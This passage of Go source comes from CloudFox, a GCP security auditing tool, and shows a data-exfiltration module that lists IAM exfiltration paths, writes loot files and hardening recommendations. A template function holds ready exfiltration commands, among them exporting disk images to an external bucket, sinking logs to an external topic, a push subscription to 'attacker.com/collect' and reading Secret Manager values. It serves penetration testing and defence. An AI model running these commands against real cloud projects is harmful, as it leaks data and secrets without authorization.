		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not analyze exfil permissions for project %s", projectID))
		return
	}

	// Convert AttackPath to PermissionBasedExfilPath
	for _, path := range paths {
		exfilPath := PermissionBasedExfilPath{
			Principal:      path.Principal,
			PrincipalType:  path.PrincipalType,
			ProjectID:      projectID,
			Permission:     path.Method,
			Category:       path.Category,
			RiskLevel:      "HIGH", // Default risk level
			Description:    path.Description,
			ExploitCommand: path.ExploitCommand,
		}

		m.mu.Lock()
		m.ProjectPermissionBasedExfil[projectID] = append(m.ProjectPermissionBasedExfil[projectID], exfilPath)
		m.mu.Unlock()
	}

	// Also analyze resource-level IAM
	resourcePaths, err := attackSvc.AnalyzeResourceAttackPaths(ctx, projectID, "exfil")
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
				fmt.Sprintf("Could not analyze resource-level exfil permissions for project %s", projectID))
		}
	} else {
		for _, path := range resourcePaths {
			exfilPath := PermissionBasedExfilPath{
				Principal:      path.Principal,
				PrincipalType:  path.PrincipalType,
				ProjectID:      projectID,
				Permission:     path.Method,
				Category:       path.Category + " (Resource: " + path.ScopeName + ")",
				RiskLevel:      "HIGH",
				Description:    path.Description,
				ExploitCommand: path.ExploitCommand,
			}

			m.mu.Lock()
			m.ProjectPermissionBasedExfil[projectID] = append(m.ProjectPermissionBasedExfil[projectID], exfilPath)
			m.mu.Unlock()
		}
	}
}

// generateExfilExploitCommand generates an exploit command for a data exfil permission
func (m *DataExfiltrationModule) generateExfilExploitCommand(permission, projectID string) string {
	switch permission {
	case "compute.images.create":
		return fmt.Sprintf(`# Create image from disk (for export)
gcloud compute images create exfil-image --source-disk=DISK_NAME --source-disk-zone=ZONE --project=%s
# Export to external bucket
gcloud compute images export --image=exfil-image --destination-uri=gs://EXTERNAL_BUCKET/image.tar.gz --project=%s`, projectID, projectID)
	case "compute.snapshots.create":
		return fmt.Sprintf(`# Create snapshot from disk (for export)
gcloud compute snapshots create exfil-snapshot --source-disk=DISK_NAME --source-disk-zone=ZONE --project=%s`, projectID)
	case "logging.sinks.create":
		return fmt.Sprintf(`# Create logging sink to external destination
gcloud logging sinks create exfil-sink pubsub.googleapis.com/projects/EXTERNAL_PROJECT/topics/stolen-logs --project=%s`, projectID)
	case "cloudsql.instances.export":
		return fmt.Sprintf(`# Export Cloud SQL database to GCS
gcloud sql export sql INSTANCE_NAME gs://BUCKET/export.sql --database=DB_NAME --project=%s`, projectID)
	case "pubsub.subscriptions.create":
		return fmt.Sprintf(`# Create subscription to intercept messages
gcloud pubsub subscriptions create exfil-sub --topic=TOPIC_NAME --push-endpoint=https://attacker.com/collect --project=%s`, projectID)
	case "bigquery.tables.export":
		return fmt.Sprintf(`# Export BigQuery table to GCS
bq extract --destination_format=CSV '%s:DATASET.TABLE' gs://BUCKET/export.csv`, projectID)
	case "storagetransfer.jobs.create":
		return fmt.Sprintf(`# Create transfer job to external cloud (requires API)
gcloud transfer jobs create gs://SOURCE_BUCKET s3://DEST_BUCKET --project=%s`, projectID)
	case "secretmanager.versions.access":
		return fmt.Sprintf(`# Access secret values
gcloud secrets versions access latest --secret=SECRET_NAME --project=%s`, projectID)
	default:
		return fmt.Sprintf("# Permission: %s\n# Refer to GCP documentation for exploitation", permission)
	}
}

// ------------------------------
// Loot File Management
// ------------------------------
func (m *DataExfiltrationModule) addExfiltrationPathToLoot(projectID string, path ExfiltrationPath) {
	if path.ExploitCommand == "" {
		return
	}

	lootFile := m.LootMap[projectID]["data-exfiltration-commands"]
	if lootFile == nil {
		return
	}

	lootFile.Contents += fmt.Sprintf(
		"#############################################\n"+
			"## [ACTUAL] %s: %s\n"+
			"## Project: %s\n"+
			"## Description: %s\n"+
			"## Destination: %s\n"+
			"#############################################\n",
		path.PathType,
		path.ResourceName,
		path.ProjectID,
		path.Description,
		path.Destination,
	)

	lootFile.Contents += fmt.Sprintf("%s\n\n", path.ExploitCommand)
}

func (m *DataExfiltrationModule) addPotentialVectorToLoot(projectID string, vector PotentialVector) {
	if vector.ExploitCommand == "" {
		return
	}

	lootFile := m.LootMap[projectID]["data-exfiltration-commands"]
	if lootFile == nil {
		return
	}

	lootFile.Contents += fmt.Sprintf(
		"#############################################\n"+
			"## [POTENTIAL] %s\n"+
			"## Project: %s\n"+
			"## Description: %s\n"+
			"## Destination: %s\n"+
			"#############################################\n",
		vector.VectorType,
		vector.ProjectID,
		vector.Description,
		vector.Destination,
	)

	lootFile.Contents += fmt.Sprintf("%s\n\n", vector.ExploitCommand)
}

func (m *DataExfiltrationModule) addHardeningRecommendationsToLoot(projectID string, recommendations []MissingHardening) {
	if len(recommendations) == 0 {
		return
	}

	// Initialize hardening loot file if not exists
	if m.LootMap[projectID]["data-exfiltration-hardening"] == nil {
		m.LootMap[projectID]["data-exfiltration-hardening"] = &internal.LootFile{
			Name:     "data-exfiltration-hardening",
			Contents: "# Data Exfiltration Prevention - Hardening Recommendations\n# Generated by CloudFox\n# These controls help prevent data exfiltration from GCP projects\n\n",
		}
	}

	lootFile := m.LootMap[projectID]["data-exfiltration-hardening"]

	lootFile.Contents += fmt.Sprintf(
		"#############################################\n"+
			"## PROJECT: %s (%s)\n"+
			"## Missing %d security control(s)\n"+
			"#############################################\n\n",
		projectID,
		m.GetProjectName(projectID),
		len(recommendations),
	)

	for _, rec := range recommendations {
		lootFile.Contents += fmt.Sprintf(
			"## [%s] %s\n"+
				"## Description: %s\n"+
				"#############################################\n",
			rec.Category,
			rec.Control,
			rec.Description,
		)
		lootFile.Contents += fmt.Sprintf("%s\n\n", rec.Recommendation)
	}
}

// ------------------------------
// Output Generation
// ------------------------------

func (m *DataExfiltrationModule) writeOutput(ctx context.Context, logger internal.Logger) {
	if m.Hierarchy != nil && !m.FlatOutput {
		m.writeHierarchicalOutput(ctx, logger)
	} else {
		m.writeFlatOutput(ctx, logger)
	}
}

func (m *DataExfiltrationModule) getMisconfigHeader() []string {
	return []string{
		"Project ID",
		"Project Name",
		"Resource",
		"Type",
		"Destination",
		"Public",
		"Size",
	}
}

func (m *DataExfiltrationModule) getVectorHeader() []string {
	return []string{
		"Project ID",
		"Project Name",
		"Resource",
		"Type",
		"Destination",
		"Public",
		"Size",
	}
}

func (m *DataExfiltrationModule) getHardeningHeader() []string {
	return []string{
		"Project ID",
		"Project Name",
		"Category",
		"Control",
		"Description",
	}
}

func (m *DataExfiltrationModule) pathsToTableBody(paths []ExfiltrationPath, exports []PublicExport) [][]string {
	var body [][]string

	// Track which resources we've added from PublicExports
	publicResources := make(map[string]PublicExport)
	for _, e := range exports {
		key := fmt.Sprintf("%s:%s:%s", e.ProjectID, e.ResourceType, e.ResourceName)
		publicResources[key] = e
	}

	// Add exfiltration paths (actual misconfigurations)
	for _, p := range paths {
		key := fmt.Sprintf("%s:%s:%s", p.ProjectID, p.PathType, p.ResourceName)
		export, isPublic := publicResources[key]

		publicStatus := "No"
		size := "-"
		if isPublic {
			publicStatus = "Yes"
			size = export.Size
			delete(publicResources, key)
		}

		body = append(body, []string{
			p.ProjectID,
			m.GetProjectName(p.ProjectID),
			p.ResourceName,
			p.PathType,
			p.Destination,
			publicStatus,
			size,
		})
	}

	// Add any remaining public exports not already covered
	for _, e := range publicResources {
		body = append(body, []string{
			e.ProjectID,
			m.GetProjectName(e.ProjectID),
			e.ResourceName,
			e.ResourceType,
			"Public access: " + e.AccessLevel,
			"Yes",
			e.Size,
		})
	}

	return body
}

func (m *DataExfiltrationModule) vectorsToTableBody(vectors []PotentialVector) [][]string {
	var body [][]string
	for _, v := range vectors {
		body = append(body, []string{
			v.ProjectID,
			m.GetProjectName(v.ProjectID),
			v.ResourceName,
			v.VectorType,
			v.Destination,
			"No",
			"-",
		})
	}
	return body
}

func (m *DataExfiltrationModule) hardeningToTableBody(recs []MissingHardening) [][]string {
	var body [][]string
	for _, h := range recs {
		body = append(body, []string{
			h.ProjectID,
			m.GetProjectName(h.ProjectID),
			h.Category,
			h.Control,
			h.Description,
		})
	}
	return body
}

func (m *DataExfiltrationModule) buildTablesForProject(projectID string, hardeningRecs []MissingHardening) []internal.TableFile {
	var tableFiles []internal.TableFile

	paths := m.ProjectExfiltrationPaths[projectID]
	exports := m.ProjectPublicExports[projectID]
	vectors := m.ProjectPotentialVectors[projectID]

	if len(paths) > 0 || len(exports) > 0 {
		body := m.pathsToTableBody(paths, exports)
		if len(body) > 0 {
			tableFiles = append(tableFiles, internal.TableFile{
				Name:   "data-exfiltration-misconfigurations",
				Header: m.getMisconfigHeader(),
				Body:   body,
			})
		}
	}

	if len(vectors) > 0 {
		tableFiles = append(tableFiles, internal.TableFile{
			Name:   "data-exfiltration-vectors",
			Header: m.getVectorHeader(),
			Body:   m.vectorsToTableBody(vectors),
		})
	}

	// Filter hardening for this project
	var projectHardening []MissingHardening
	for _, h := range hardeningRecs {
		if h.ProjectID == projectID {
			projectHardening = append(projectHardening, h)
		}
	}

	if len(projectHardening) > 0 {
		tableFiles = append(tableFiles, internal.TableFile{
			Name:   "data-exfiltration-hardening",
			Header: m.getHardeningHeader(),
			Body:   m.hardeningToTableBody(projectHardening),
		})
	}

	return tableFiles
}

func (m *DataExfiltrationModule) writeHierarchicalOutput(ctx context.Context, logger internal.Logger) {
	outputData := internal.HierarchicalOutputData{
		OrgLevelData:     make(map[string]internal.CloudfoxOutput),
		ProjectLevelData: make(map[string]internal.CloudfoxOutput),
	}

	hardeningRecs := m.generateMissingHardeningRecommendations()

	// Collect all project IDs that have data
	projectIDs := make(map[string]bool)
	for projectID := range m.ProjectExfiltrationPaths {
		projectIDs[projectID] = true
	}
	for projectID := range m.ProjectPotentialVectors {
		projectIDs[projectID] = true
	}
	for projectID := range m.ProjectPublicExports {
		projectIDs[projectID] = true
	}
	for _, h := range hardeningRecs {
		projectIDs[h.ProjectID] = true
	}

	// Generate playbook once for all projects
	playbook := m.generatePlaybook()
	playbookAdded := false

	for projectID := range projectIDs {
		// Ensure loot is initialized
		m.initializeLootForProject(projectID)

		// Filter hardening recommendations for this project and add to loot
		var projectHardening []MissingHardening
		for _, h := range hardeningRecs {
			if h.ProjectID == projectID {
				projectHardening = append(projectHardening, h)
			}
		}
		m.addHardeningRecommendationsToLoot(projectID, projectHardening)

		tableFiles := m.buildTablesForProject(projectID, hardeningRecs)

		var lootFiles []internal.LootFile
		if projectLoot, ok := m.LootMap[projectID]; ok {
			for _, loot := range projectLoot {
				if loot != nil && loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# WARNING: Only use with proper authorization!\n\n") {
					lootFiles = append(lootFiles, *loot)
				}
			}
		}

		// Add playbook to first project only (to avoid duplication)
		if playbook != nil && playbook.Contents != "" && !playbookAdded {
			lootFiles = append(lootFiles, *playbook)
			playbookAdded = true
		}

		outputData.ProjectLevelData[projectID] = DataExfiltrationOutput{Table: tableFiles, Loot: lootFiles}
	}

	pathBuilder := m.BuildPathBuilder()

	err := internal.HandleHierarchicalOutputSmart("gcp", m.Format, m.Verbosity, m.WrapTable, pathBuilder, outputData)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing hierarchical output: %v", err), GCP_DATAEXFILTRATION_MODULE_NAME)
	}
}

func (m *DataExfiltrationModule) writeFlatOutput(ctx context.Context, logger internal.Logger) {
	allPaths := m.getAllExfiltrationPaths()
	allVectors := m.getAllPotentialVectors()
	allExports := m.getAllPublicExports()
	hardeningRecs := m.generateMissingHardeningRecommendations()

	// Add hardening recommendations to loot files
	for _, projectID := range m.ProjectIDs {
		m.initializeLootForProject(projectID)
		var projectHardening []MissingHardening
		for _, h := range hardeningRecs {
			if h.ProjectID == projectID {
				projectHardening = append(projectHardening, h)
			}
		}
		m.addHardeningRecommendationsToLoot(projectID, projectHardening)
	}

	// Build tables
	tables := []internal.TableFile{}

	misconfigBody := m.pathsToTableBody(allPaths, allExports)
	if len(misconfigBody) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "data-exfiltration-misconfigurations",
			Header: m.getMisconfigHeader(),
			Body:   misconfigBody,
		})
	}

	if len(allVectors) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "data-exfiltration-vectors",
			Header: m.getVectorHeader(),
			Body:   m.vectorsToTableBody(allVectors),
		})
	}

	if len(hardeningRecs) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "data-exfiltration-hardening",
			Header: m.getHardeningHeader(),
			Body:   m.hardeningToTableBody(hardeningRecs),
		})
	}

	// Collect loot files
	var lootFiles []internal.LootFile
	for _, projectLoot := range m.LootMap {
		for _, loot := range projectLoot {
			if loot != nil && loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# WARNING: Only use with proper authorization!\n\n") {
				lootFiles = append(lootFiles, *loot)
			}
		}
	}

	// Add playbook
	playbook := m.generatePlaybook()
	if playbook != nil && playbook.Contents != "" {
		lootFiles = append(lootFiles, *playbook)
	}

	output := DataExfiltrationOutput{
		Table: tables,
		Loot:  lootFiles,
	}

	scopeNames := make([]string, len(m.ProjectIDs))
	for i, projectID := range m.ProjectIDs {
		scopeNames[i] = m.GetProjectName(projectID)
	}

	err := internal.HandleOutputSmart(
		"gcp",
		m.Format,
		m.OutputDirectory,
		m.Verbosity,
		m.WrapTable,
		"project",
		m.ProjectIDs,
		scopeNames,
		m.Account,
		output,
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), GCP_DATAEXFILTRATION_MODULE_NAME)
		m.CommandCounter.Error++
	}
}
